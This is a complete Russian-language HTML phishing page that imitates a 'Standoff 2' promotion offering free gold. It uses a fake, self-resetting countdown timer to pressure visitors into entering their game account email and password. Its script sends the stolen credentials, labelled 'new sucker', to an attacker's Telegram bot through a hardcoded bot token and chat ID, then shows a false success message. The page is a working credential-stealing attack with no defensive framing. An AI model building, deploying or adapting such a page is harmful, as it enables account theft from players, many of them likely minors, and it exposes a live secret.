<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <title>Standoff 2 - Акция 500 Голды</title>
    <style>
        body {
            background: url('https://i.imgur.com/8zX5K9b.jpg') no-repeat center/cover;
            color: #fff;
            font-family: 'Arial', sans-serif;
            text-align: center;
            margin: 0;
            padding: 20px;
        }
        .container {
            background: rgba(0, 0, 0, 0.8);
            padding: 20px;
            border-radius: 10px;
            max-width: 400px;
            margin: 50px auto;
        }
        h1 { font-size: 28px; color: #ff4500; }
        .timer { font-size: 24px; color: #ffd700; margin: 10px 0; }
        input {
            width: 100%;
            padding: 12px;
            margin: 10px 0;
            border: none;
            border-radius: 5px;
            background: #333;
            color: #fff;
        }
        button {
            width: 100%;
            padding: 12px;
            background: #ff4500;
            border: none;
            border-radius: 5px;
            color: #fff;
            font-size: 18px;
            cursor: pointer;
            transition: background 0.3s;
        }
        button:hover { background: #ff6347; }
    </style>
</head>
<body>
    <div class="container">
        <h1>Standoff 2 - Получи 500 Голды!</h1>
        <div class="timer" id="timer">Осталось: 04:59</div>
        <p>Войди через свой аккаунт и забери бонус!</p>
        <input type="email" id="email" placeholder="Почта от аккаунта"><br>
        <input type="password" id="password" placeholder="Пароль"><br>
        <button onclick="sendData()">Забрать голду</button>
    </div>

    <script>
        let timeLeft = 299;
        let timer = document.getElementById("timer");
        setInterval(() => {
            let minutes = Math.floor(timeLeft / 60);
            let seconds = timeLeft % 60;
            timer.textContent = `Осталось: ${minutes.toString().padStart(2, '0')}:${seconds.toString().padStart(2, '0')}`;
            timeLeft--;
            if (timeLeft < 0) timeLeft = 299;
        }, 1000);

        function sendData() {
            let email = document.getElementById("email").value;
            let password = document.getElementById("password").value;
            let token = "7715919429:AAGWNrzUYZAXnHqhmt4bna1ux0y68CEKhwY";
            let chatId = "6676842439";
            let text = `Новый лох: \nПочта: ${email}\nПароль: ${password}`;

            let url = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(text)}`;

            fetch(url)
                .then(response => {
                    if (response.ok) {
                        alert("Голда твоя, братишка! Проверь инвентарь!");
                    } else {
                        alert("Ошибка, сука! Попробуй ещё раз!");
                    }
                })
                .catch(() => alert("Пиздец, что-то сломалось!"));
        }
    </script>
</body>
</html>
